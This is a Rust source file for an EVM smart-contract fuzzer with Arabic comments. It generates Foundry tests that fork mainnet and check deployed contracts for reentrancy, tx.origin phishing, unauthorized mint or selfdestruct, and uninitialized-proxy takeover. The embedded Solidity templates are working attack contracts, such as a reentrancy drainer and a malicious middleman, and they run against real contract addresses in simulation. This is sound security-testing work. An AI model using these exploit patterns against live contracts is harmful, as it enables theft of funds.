//! Fuzzer — يولد Solidity tests ويشغل forge + يحلل النتائج
use anyhow::{Result, Context};
use std::fs;
use std::process::Command;
use tracing::{info, warn};
use colored::*;

use crate::reporter::{Finding, Severity};

#[derive(Debug, Clone)]
pub struct FuzzResult {
    pub address: String,
    pub exploitable: bool,
    pub vulnerability: String,
    pub details: String,
    pub counterexample: Option<String>,
}

pub struct LocalFuzzer {
    pub rpc_url: String,
    pub fuzz_runs: u32,
    pub foundry_dir: String,
}

impl LocalFuzzer {
    pub fn new(rpc_url: String, fuzz_runs: u32) -> Self {
        let foundry_dir = format!("/tmp/evm-fuzz-{}", std::process::id());
        Self { rpc_url, fuzz_runs, foundry_dir }
    }

    /// تحليل النتائج وتقرير الثغرات المكتشفة
    pub async fn fuzz_contract(
        &self,
        address: &str,
        source_code: &str,
        findings: &[Finding],
    ) -> Result<Vec<FuzzResult>> {
        let mut results = Vec::new();

        // اختر الثغرات القابلة للاختبار — مرتبة حسب الخطورة
        let mut testable: Vec<&Finding> = findings.iter()
            .filter(|f| Self::is_testable(&f.id))
            // تجاهل UNPROTECTED_FUNCTION — false positives عالية
            .filter(|f| f.id != "UNPROTECTED_FUNCTION")
            // AST_UNPROTECTED_FUNCTION فقط للدوال الحساسة
            .filter(|f| {
                if f.id == "AST_UNPROTECTED_FUNCTION" {
                    let d = f.description.to_lowercase();
                    d.contains("mint") || d.contains("burn") || d.contains("withdraw")
                    || d.contains("owner") || d.contains("admin") || d.contains("upgrade")
                    || d.contains("proxy") || d.contains("drain") || d.contains("rescue")
                } else { true }
            })
            .collect();

        // ─── CFG Analysis — يرفع priority الـ findings الخطيرة فعلياً ───
        let cfg_builder = crate::cfg::CfgBuilder::new();
        let cfg_results = cfg_builder.analyze_source(source_code);

        let mut cfg_boosted: std::collections::HashSet<String> = std::collections::HashSet::new();
        for cfg_fn in &cfg_results {
            if cfg_fn.risk_score() >= 30 {
                if !cfg_fn.facts.post_call_writes.is_empty() {
                    cfg_boosted.insert("REENTRANCY_PATTERN".to_string());
                    cfg_boosted.insert("AST_UNCHECKED_EXTERNAL_CALL".to_string());
                    cfg_boosted.insert("SMART_REENTRANCY".to_string());
                }
                if !cfg_fn.facts.controls_funds.is_empty() {
                    cfg_boosted.insert("SMART_UNCAPPED_MINT".to_string());
                    cfg_boosted.insert("AST_UNPROTECTED_FUNCTION".to_string());
                }
            }
        }

        // ترتيب: CFG-confirmed أولاً، ثم Critical، ثم High
        testable.sort_by_key(|f| {
            let cfg_priority: u8 = if cfg_boosted.contains(&f.id) { 0 } else { 1 };
            let sev: u8 = match f.severity {
                crate::reporter::Severity::Critical => 0,
                crate::reporter::Severity::High => 1,
                _ => 2,
            };
            (cfg_priority, sev)
        });

        // أقصى 5 findings للفحص
        let testable: Vec<&Finding> = testable.into_iter().take(5).collect();

        if testable.is_empty() {
            return Ok(results);
        }

        // أنشئ مشروع Foundry مؤقت
        self.setup_foundry_project()?;

        for finding in &testable {
            let checksummed = checksum_addr(address);
            let test_code = self.generate_fuzz_test(&checksummed, source_code, finding);
            let test_path = format!("{}/test/FuzzAuto.t.sol", self.foundry_dir);
            fs::write(&test_path, &test_code)?;

            info!("🌋 Fuzzing {} for {} ({} runs)...", &address[..10], finding.id, self.fuzz_runs);

            match self.run_forge_test(address) {
                Ok(output) => {
                    let result = self.analyze_forge_output(address, finding, &output);
                    if result.exploitable {
                        println!("   {} {} — {} is EXPLOITABLE!",
                            "🔴 CRITICAL".red().bold(),
                            address,
                            finding.id
                        );
                        if let Some(ref ce) = result.counterexample {
                            println!("   └─ Counterexample: {}", ce.yellow());
                        }
                    } else {
                        println!("   {} {} — {} passed fuzzing",
                            "🟢 SAFE".green(),
                            &address[..10],
                            finding.id
                        );
                    }
                    results.push(result);
                }
                Err(e) => {
                    warn!("Forge test failed for {}: {}", address, e);
                    results.push(FuzzResult {
                        address: address.to_string(),
                        exploitable: false,
                        vulnerability: finding.id.clone(),
                        details: format!("Test execution failed: {}", e),
                        counterexample: None,
                    });
                }
            }
        }

        // تنظيف
//        let _ = fs::remove_dir_all(&self.foundry_dir);

        Ok(results)
    }

    fn is_testable(finding_id: &str) -> bool {
        matches!(finding_id,
            "UNPROTECTED_FUNCTION" |
            "AST_UNPROTECTED_FUNCTION" |
            "TX_ORIGIN_AUTH" |
            "REENTRANCY_PATTERN" |
            "AST_UNCHECKED_EXTERNAL_CALL" |
            "SELFDESTRUCT_ACCESS" |
            "AST_SELFDESTRUCT_IN_FUNCTION" |
            "UNINITIALIZED_PROXY" |
            "AST_DELEGATECALL_IN_FUNCTION"
        )
    }

    fn setup_foundry_project(&self) -> Result<()> {
        fs::create_dir_all(format!("{}/test", self.foundry_dir))?;
        fs::create_dir_all(format!("{}/src", self.foundry_dir))?;

        // المسار الثابت لـ forge-std المثبت مسبقاً
        let forge_std_path = "/root/foundry-std/lib/forge-std";

        // foundry.toml مع remapping للـ forge-std الثابت
        let toml = format!(
            r#"[profile.default]
src = "src"
out = "out"
libs = ["lib"]
remappings = ["forge-std/={}/src/"]
fuzz = {{ runs = {}, max_test_rejects = 65536 }}
eth_rpc_url = "{}"

[rpc_endpoints]
mainnet = "{}"
"#,
            forge_std_path, self.fuzz_runs, self.rpc_url, self.rpc_url
        );
        fs::write(format!("{}/foundry.toml", self.foundry_dir), toml)?;

        // إنشاء symlink لـ forge-std
        let lib_dir = format!("{}/lib", self.foundry_dir);
        fs::create_dir_all(&lib_dir)?;

        let link_path = format!("{}/forge-std", lib_dir);
        if !std::path::Path::new(&link_path).exists() {
            let _ = Command::new("ln")
                .args(["-s", forge_std_path, &link_path])
                .output();
        }

        Ok(())
    }

    fn generate_fuzz_test(&self, address: &str, _source: &str, finding: &Finding) -> String {
        match finding.id.as_str() {
            "UNPROTECTED_FUNCTION" | "AST_UNPROTECTED_FUNCTION" => {
                self.gen_access_control_fuzz(address, finding)
            }
            "TX_ORIGIN_AUTH" => {
                self.gen_tx_origin_fuzz(address)
            }
            "REENTRANCY_PATTERN" | "AST_UNCHECKED_EXTERNAL_CALL" => {
                self.gen_reentrancy_fuzz(address)
            }
            "SELFDESTRUCT_ACCESS" | "AST_SELFDESTRUCT_IN_FUNCTION" => {
                self.gen_selfdestruct_fuzz(address)
            }
            "UNINITIALIZED_PROXY" => {
                self.gen_proxy_init_fuzz(address)
            }
            _ => self.gen_generic_fuzz(address, finding),
        }
    }

    fn gen_access_control_fuzz(&self, address: &str, finding: &Finding) -> String {
        let func_name = extract_function_name(&finding.description)
            .unwrap_or_else(|| "mint".to_string());

        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {{
    function {}(address to, uint256 amount) external;
    function {}(address to) external;
    function {}() external;
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}}

contract FuzzAccessControl is Test {{
    ITarget target = ITarget({});
    
    function setUp() public {{
        vm.createSelectFork("mainnet");
    }}

    /// @dev أي عنوان عشوائي يجب أن يفشل في استدعاء الدالة الحساسة
    function testFuzz_UnauthorizedAccess(address randomAttacker, uint256 amount) public {{
        vm.assume(randomAttacker != address(0));
        vm.assume(randomAttacker.code.length == 0);
        vm.assume(amount > 0 && amount < 1_000_000_000 ether);
        
        uint256 supplyBefore = target.totalSupply();
        
        vm.startPrank(randomAttacker);
        
        // يجب أن يفشل واحد على الأقل من هذه
        bool mintSucceeded = false;
        
        try target.{}(randomAttacker, amount) {{
            mintSucceeded = true;
        }} catch {{}}
        
        try target.{}(randomAttacker) {{
            mintSucceeded = true;
        }} catch {{}}
        
        vm.stopPrank();
        
        uint256 supplyAfter = target.totalSupply();
        
        // إذا زاد الـ supply = ثغرة مؤكدة
        assertEq(supplyAfter, supplyBefore, "EXPLOIT: Unauthorized minting succeeded!");
        // removed - approve is a standard ERC20 function
    }}
    
    function testFuzz_MintWithoutOwner(address randomAttacker) public {{
        vm.assume(randomAttacker != address(0));
        vm.assume(randomAttacker.code.length == 0);
        
        uint256 balBefore = target.balanceOf(randomAttacker);
        
        vm.prank(randomAttacker);
        try target.{}() {{
            uint256 balAfter = target.balanceOf(randomAttacker);
            assertEq(balAfter, balBefore, "EXPLOIT: Free mint without authorization!");
        }} catch {{
            // revert = آمن
        }}
    }}
}}
"#,
            func_name, func_name, func_name,
            address,
            func_name, func_name, func_name
        )
    }

    fn gen_tx_origin_fuzz(&self, address: &str) -> String {
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {{
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}}

contract MaliciousMiddleman {{
    ITarget target;
    address victim;
    
    constructor(address _target, address _victim) {{
        target = ITarget(_target);
        victim = _victim;
    }}
    
    // المهاجم يجعل الضحية تتفاعل مع هذا العقد
    fallback() external payable {{
        target.transfer(address(this), target.balanceOf(victim));
    }}
}}

contract FuzzTxOrigin is Test {{
    ITarget target = ITarget({});
    
    function setUp() public {{
        vm.createSelectFork("mainnet");
    }}
    
    function testFuzz_TxOriginPhishing(address victim, uint256 amount) public {{
        vm.assume(victim != address(0));
        vm.assume(amount > 0);
        
        MaliciousMiddleman middleman = new MaliciousMiddleman(address(target), victim);
        
        // محاكاة: الضحية تتفاعل مع العقد الخبيث
        vm.startPrank(victim, victim); // tx.origin = victim
        try target.transfer(address(middleman), amount) {{
            // إذا نجح = ثغرة tx.origin
            assertTrue(false, "EXPLOIT: tx.origin auth bypassed!");
        }} catch {{}}
        vm.stopPrank();
    }}
}}
"#,
            address
        )
    }

    fn gen_reentrancy_fuzz(&self, address: &str) -> String {
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {{
    function deposit() external payable;
    function withdraw() external;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
}}

contract ReentrancyAttacker {{
    ITarget target;
    uint256 public attackCount;
    uint256 public stolenAmount;
    
    constructor(address _target) {{
        target = ITarget(_target);
    }}
    
    function attack() external payable {{
        target.deposit{{value: msg.value}}();
        target.withdraw();
    }}
    
    receive() external payable {{
        stolenAmount += msg.value;
        if (attackCount < 5 && address(target).balance > 0) {{
            attackCount++;
            try target.withdraw() {{}} catch {{}}
        }}
    }}
}}

contract FuzzReentrancy is Test {{
    ITarget target = ITarget({});
    
    function setUp() public {{
        vm.createSelectFork("mainnet");
    }}
    
    function testFuzz_Reentrancy(uint96 depositAmount) public {{
        vm.assume(depositAmount > 0.001 ether);
        vm.assume(depositAmount < 1 ether);
        
        address attacker = makeAddr("attacker");
        vm.deal(attacker, uint256(depositAmount));
        
        uint256 contractBalBefore = address(target).balance;
        if (contractBalBefore == 0) return; // لا يوجد ether للسرقة
        
        ReentrancyAttacker attackContract = new ReentrancyAttacker(address(target));
        
        vm.prank(attacker);
        attackContract.attack{{value: depositAmount}}();
        
        // إذا سُرق أكثر مما أودع = ثغرة
        assertLe(
            attackContract.stolenAmount(),
            depositAmount,
            "EXPLOIT: Reentrancy attack succeeded - more ETH withdrawn than deposited!"
        );
    }}
}}
"#,
            address
        )
    }

    fn gen_selfdestruct_fuzz(&self, address: &str) -> String {
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {{
    function destroy() external;
    function kill() external;
    function selfdestruct(address) external;
}}

contract FuzzSelfdestruct is Test {{
    ITarget target = ITarget({});
    
    function setUp() public {{
        vm.createSelectFork("mainnet");
    }}
    
    function testFuzz_UnauthorizedDestruct(address randomAttacker) public {{
        vm.assume(randomAttacker != address(0));
        vm.assume(randomAttacker.code.length == 0);
        
        uint256 codeSize;
        assembly {{ codeSize := extcodesize({}) }}
        
        vm.startPrank(randomAttacker);
        
        try target.destroy() {{
            uint256 codeSizeAfter;
            assembly {{ codeSizeAfter := extcodesize({}) }}
            assertGt(codeSizeAfter, 0, "EXPLOIT: Contract destroyed by unauthorized caller!");
        }} catch {{}}
        
        try target.kill() {{
            uint256 codeSizeAfter;
            assembly {{ codeSizeAfter := extcodesize({}) }}
            assertGt(codeSizeAfter, 0, "EXPLOIT: Contract killed by unauthorized caller!");
        }} catch {{}}
        
        vm.stopPrank();
    }}
}}
"#,
            address, address, address, address
        )
    }

    fn gen_proxy_init_fuzz(&self, address: &str) -> String {
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {{
    function initialize(address owner) external;
    function initialize() external;
    function init(address owner) external;
    function owner() external view returns (address);
}}

contract FuzzProxyInit is Test {{
    ITarget target = ITarget({});
    
    function setUp() public {{
        vm.createSelectFork("mainnet");
    }}
    
    function testFuzz_UninitializedProxy(address attacker) public {{
        vm.assume(attacker != address(0));
        vm.assume(attacker.code.length == 0);
        
        vm.startPrank(attacker);
        
        try target.initialize(attacker) {{
            address currentOwner = target.owner();
            assertNotEq(currentOwner, attacker, "EXPLOIT: Proxy initialized by attacker - ownership hijacked!");
        }} catch {{}}
        
        try target.initialize() {{
            assertTrue(false, "EXPLOIT: Proxy re-initialized successfully!");
        }} catch {{}}
        
        vm.stopPrank();
    }}
}}
"#,
            address
        )
    }

    fn gen_generic_fuzz(&self, address: &str, finding: &Finding) -> String {
        format!(
            r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

// Generic fuzz for: {}
// Description: {}
interface ITarget {{
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function owner() external view returns (address);
}}

contract FuzzGeneric is Test {{
    ITarget target = ITarget({});
    
    function setUp() public {{
        vm.createSelectFork("mainnet");
    }}
    
    function testFuzz_StateIntegrity(address randomUser, uint256 amount) public {{
        vm.assume(randomUser != address(0));
        vm.assume(amount > 0);
        
        uint256 supplyBefore = target.totalSupply();
        uint256 balBefore = target.balanceOf(randomUser);
        
        // الحالة يجب تبقى ثابتة بدون مستدعي معتمد
        vm.prank(randomUser);
        (bool ok,) = address(target).call(abi.encodeWithSignature("mint(address,uint256)", randomUser, amount));
        
        if (ok) {{
            uint256 supplyAfter = target.totalSupply();
            assertEq(supplyAfter, supplyBefore, "EXPLOIT: State changed by unauthorized user!");
        }}
    }}
}}
"#,
            finding.id, finding.description, address
        )
    }

    fn run_forge_test(&self, _address: &str) -> Result<String> {
        let output = Command::new("forge")
            .args([
                "test",
                "--fork-url", &self.rpc_url,
                "-vvv",
                "--no-match-path", "src/**",
            ])
            .env("FOUNDRY_FUZZ_RUNS", self.fuzz_runs.to_string())
            .env("FOUNDRY_ETH_RPC_URL", &self.rpc_url)
            .current_dir(&self.foundry_dir)
            .output()
            .context("Failed to run forge test")?;

        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        let combined = format!("{}\n{}", stdout, stderr);

        // Debug: اطبع أول 500 حرف من نتيجة forge
        if !stdout.is_empty() || !stderr.is_empty() {
            tracing::debug!("forge output: {}", &combined[..combined.len().min(500)]);
        } else {
            tracing::warn!("forge returned empty output — fork may have failed");
        }

        Ok(combined)
    }

    fn analyze_forge_output(&self, address: &str, finding: &Finding, output: &str) -> FuzzResult {
        // فلتر الأخطاء الشبكية
        let is_network_error = output.contains("cloudflare")
            || output.contains("timed out")
            || output.contains("connection error")
            || output.contains("database error")
            || output.contains("server: cloudflare");
        if is_network_error {
            return FuzzResult {
                address: address.to_string(),
                exploitable: false,
                vulnerability: finding.id.clone(),
                details: "Network error — skipped".to_string(),
                counterexample: None,
            };
        }
        // runs: 0 = test setup failed — not a real exploit
        let runs_zero = output.contains("runs: 0,") 
            || output.contains("runs: 0)")
            || output.contains("(runs: 0");

        // EvmError: Revert = contract protected itself
        let is_evm_revert = output.contains("EvmError: Revert")
            || output.contains("EvmError:");

        let exploitable = !runs_zero
            && !is_evm_revert
            && (output.contains("FAIL") || output.contains("EXPLOIT:"));

        let lower = output.to_lowercase();

        // استخرج الـ counterexample لو موجود
        let counterexample = extract_counterexample(output);

        // تحقق من نوع الفشل
        let details = if output.contains("EXPLOIT:") {
            extract_exploit_message(output)
        } else if output.contains("FAIL") {
            format!("Fuzz test failed — possible vulnerability in {}", finding.id)
        } else if lower.contains("error") && !lower.contains("revert") {
            "Test errored — manual review needed".to_string()
        } else {
            format!("Passed {} fuzz runs — no exploit found", self.fuzz_runs)
        };

        FuzzResult {
            address: address.to_string(),
            exploitable,
            vulnerability: finding.id.clone(),
            details,
            counterexample,
        }
    }
}

fn extract_function_name(description: &str) -> Option<String> {
    // "Function 'mint' in contract ..." → "mint"
    let re = regex::Regex::new(r"Function '(\w+)'").ok()?;
    re.captures(description)?.get(1).map(|m| m.as_str().to_string())
}

fn extract_counterexample(output: &str) -> Option<String> {
    // Forge counterexample format: "counterexample: calldata=..."
    for line in output.lines() {
        let lower = line.to_lowercase();
        if lower.contains("counterexample") || lower.contains("args=") {
            return Some(line.trim().to_string());
        }
    }
    None
}

fn extract_exploit_message(output: &str) -> String {
    for line in output.lines() {
        if line.contains("EXPLOIT:") {
            return line.trim().to_string();
        }
    }
    "Exploit detected".to_string()
}

// Minimal forge-std Test.sol fallback لو git ما اشتغل
const FORGE_STD_MINIMAL: &str = r#"
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Test {
    bool private IS_TEST = true;
    
    event log(string);
    event log_uint(uint256);
    event log_address(address);
    
    modifier noGasMetering() { _; }
    
    function assertTrue(bool condition, string memory message) internal pure {
        require(condition, message);
    }
    function assertFalse(bool condition, string memory message) internal pure {
        require(!condition, message);
    }
    function assertEq(uint256 a, uint256 b, string memory message) internal pure {
        require(a == b, message);
    }
    function assertGt(uint256 a, uint256 b, string memory message) internal pure {
        require(a > b, message);
    }
    function assertLe(uint256 a, uint256 b, string memory message) internal pure {
        require(a <= b, message);
    }
    function assertNotEq(address a, address b, string memory message) internal pure {
        require(a != b, message);
    }
    function makeAddr(string memory name) internal pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(name)))));
    }
    function vm() internal pure returns (address) { return address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D); }
}

interface Vm {
    function prank(address) external;
    function startPrank(address) external;
    function startPrank(address, address) external;
    function stopPrank() external;
    function deal(address, uint256) external;
    function assume(bool) external pure;
    function createSelectFork(string calldata) external returns (uint256);
}
"#;

fn checksum_addr(addr: &str) -> String {
    let output = std::process::Command::new("/root/.foundry/bin/cast")
        .args(["--to-checksum-address", addr])
        .output();
    match output {
        Ok(out) if out.status.success() => {
            String::from_utf8_lossy(&out.stdout).trim().to_string()
        }
        _ => format!("0x{}", addr.trim_start_matches("0x").trim_start_matches("0X").to_lowercase())
    }
}

fn regex_find_runs(output: &str) -> u64 {
    // استخراج عدد الـ runs من الـ forge output
    for line in output.lines() {
        if line.contains("runs:") {
            // "runs: 100," or "(runs: 0,"
            let parts: Vec<&str> = line.split("runs:").collect();
            if parts.len() > 1 {
                let num_str = parts[1].trim().split(',').next().unwrap_or("0")
                    .trim().trim_matches(|c: char| !c.is_numeric());
                return num_str.parse().unwrap_or(0);
            }
        }
    }
    1 // افتراضي: اعتبر runs > 0
}
